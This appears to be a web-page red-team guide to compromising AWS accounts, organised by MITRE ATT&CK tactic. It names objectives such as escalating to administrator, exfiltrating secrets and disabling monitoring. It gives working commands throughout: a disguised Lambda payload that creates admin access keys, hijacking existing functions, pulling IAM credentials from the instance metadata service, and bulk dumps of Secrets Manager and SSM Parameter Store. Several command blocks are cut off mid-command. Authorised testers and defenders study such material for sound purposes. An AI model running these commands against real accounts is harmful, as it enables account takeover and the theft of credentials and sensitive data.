AWS Cloud Red Team Operations

Comprehensive adversarial guide — initial access through full account compromise across 11 AWS services

🗺️ Attack Surface Overview
AWS exposes a massive distributed attack surface across identity (IAM/SSO), compute (EC2, Lambda, ECS/EKS), storage (S3, EBS), databases (RDS), networking (VPC), and secrets management. A single misconfiguration can chain into full account compromise.

Primary Objectives

  • Persistent access to AWS account
  • Escalate to AdministratorAccess
  • Exfiltrate secrets, DBs, source code
  • Achieve cross-account compromise
  • Disable detection and monitoring

Key Attack Tools

  • Pacu — AWS exploitation framework
  • PMapper — Priv-esc graph analysis
  • ScoutSuite — Multi-cloud auditor
  • Cloudsplaining — IAM deep analysis
  • Prowler — CIS benchmark scanner
  • CloudMapper — Network visualization

🚪 Initial Access

Obtaining the first foothold into an AWS environment

1. IAM Access Key Leakage
CRITICALT1552.001
Keys committed to GitHub, baked into Docker images, CI/CD logs, or hardcoded in source. Most common initial access vector — persist until explicitly rotated.
🔍 Discovery & Exploitation ▼

  --access-key-id AKIAIOSFODNN7EXAMPLE \
  --secret-access-key wJalrXUtnFEMI/K7MDENG

# Check permissions

aws iam list-attached-user-policies --user-name $USER

⚡ Execution

Running attacker-controlled code within the AWS environment

1. Lambda Code Injection
CRITICALT1648
Create new functions with PassRole, or hijack existing ones with UpdateFunctionCode alone (no PassRole needed).
🆕 Create Function with Admin Role ▼
# Requires: iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
cat > /tmp/pwn.py << 'EOF'
import boto3
def handler(event, context):
    iam = boto3.client("iam")
    return iam.create_access_key(UserName="admin")["AccessKey"]
EOF
cd /tmp && zip payload.zip pwn.py

aws lambda create-function \
  --function-name health-check-svc \
  --runtime python3.12 \
  --role arn:aws:iam::ACCOUNT:role/AdminRole \
  --handler pwn.handler \
  --zip-file fileb:///tmp/payload.zip
aws lambda invoke --function-name health-check-svc /tmp/out.json

# No PassRole needed — most dangerous single Lambda permission

  --query "Functions[*].[FunctionName,Role]" -o table

  --function-name TARGET_FUNCTION \
  --zip-file fileb:///tmp/payload.zip
aws lambda invoke --function-name TARGET_FUNCTION /tmp/result.json

🔑 Credential Access

Stealing AWS credentials, secrets, tokens from the environment

1. EC2 IMDS — Instance Metadata Service
CRITICALT1552.005
The IMDS at 169.254.169.254 provides temporary IAM credentials to any process on the instance. No authentication required.
📋 Full IMDS Enumeration ▼
# Get role name
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Get credentials
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Get user data (often contains secrets)
curl -s http://169.254.169.254/latest/user-data
# Full metadata tree
curl -s http://169.254.169.254/latest/meta-data/
2. Secrets Manager Bulk Extraction
CRITICALT1555
With secretsmanager:GetSecretValue, dump every secret: DB passwords, API keys, OAuth tokens, TLS certs, payment credentials.
📤 Mass Extraction ▼
aws secretsmanager list-secrets \
  --query "SecretList[*].Name" -o text | \
  tr '\t' '\n' | while read s; do
    echo "===== $s ====="
    aws secretsmanager get-secret-value \
      --secret-id "$s" --query SecretString -o text 2>/dev/null
    echo ""
  done > /tmp/all-secrets.txt
3. SSM Parameter Store Dump
HIGHT1552.001
Parameter Store contains KMS-encrypted SecureStrings. Retrieve all values recursively with ssm:GetParametersByPath.
📌 Parameter Dump ▼

  --path "/" --recursive --with-decryption \
  --query "Parameters[*].[Name,Value]" -o table
4. Lambda & ECS Environment Variable Harvest
HIGHT1552
Functions commonly store DB URLs, API keys, OAuth tokens as env vars. One call per function retrieves all of them.
⛔ Extract Env Vars ▼

    echo "=== $fn ==="
